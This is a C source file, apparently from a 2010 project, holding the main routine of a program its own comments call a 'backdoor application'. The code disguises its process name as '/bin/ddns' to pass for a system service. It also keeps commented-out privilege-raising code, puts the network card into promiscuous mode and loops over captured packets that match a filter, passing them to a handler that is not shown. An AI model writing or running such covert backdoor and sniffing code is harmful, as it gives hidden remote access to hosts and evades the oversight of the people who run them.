#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <pcap.h>

#include "stealth.h"
#include "pcapfuncs.h"
#include "pkthandler.h"

#define PROCESSMASK "/bin/ddns"

/*------------------------------------------------------------------------------
-- FUNCTION: main
--
-- DATE: May 28th 2010
--
-- REVISIONS:
--
-- DESIGNER: Tajinder Thind
--
-- PROGRAMMER: Tajinder Thind
--
-- INTERFACE: int main(int argc, char *argv[])
--
-- RETURNS: int
--
-- NOTES: Main program of the backdoor application.
-- 
------------------------------------------------------------------------------*/
int main(int argc, char *argv[])
{
	char *nic, filter[BUFSIZ];
	bpf_u_int32 maskp;
	bpf_u_int32 netp;
	pcap_t* nicd;
	struct bpf_program fp;
	u_char* args = NULL;
    size_t length;
    
	/*Filter must be given in argument*/
	if(argc < 2)
	{
		printf("Usage: %s \"<Filter>\"\n",argv[0]);
		exit(1);
	}
	
	/*Grab the filter,it will be over written when masking name*/
	strncpy(filter,argv[1],BUFSIZ);
	
	/*Change the process name*/
    length = 1;
    length += strlen(argv[0]);
    length += strlen(argv[1]);
	maskprocess(argv[0], PROCESSMASK,length);
	
	/*This doesn't really seem to work in Ubuntu or Arch*/
	/*For the time being just run as root, or raise privs before running prog*/
	/*
	if(godmode(0) < 0)
	{
		printf("Error raising privileges\n");
		exit(1);
	}
	*/
	
	/*-------------------Initialize packet capturing--------------------------*/
	
	/*Get network card*/
	nic = Lookupnic();
	
	/*Get NIC IP and Mask*/
	Lookipnet(nic, &netp, &maskp);
	
	/*Get descriptor for packet capturing and set to promiscuous mode*/
	nicd = OpenCapHandle(nic,BUFSIZ,1,-1);
	
	/*Compile the filter*/
	CompileFilter(nicd,&fp,filter,netp);
	
	/*Load filter program*/
	SetFilter(nicd, &fp);
	
	/*--------------------Start capture Loop----------------------------------*/
	pcap_loop(nicd,-1,packet_handler,args);
	
	return 0;
}
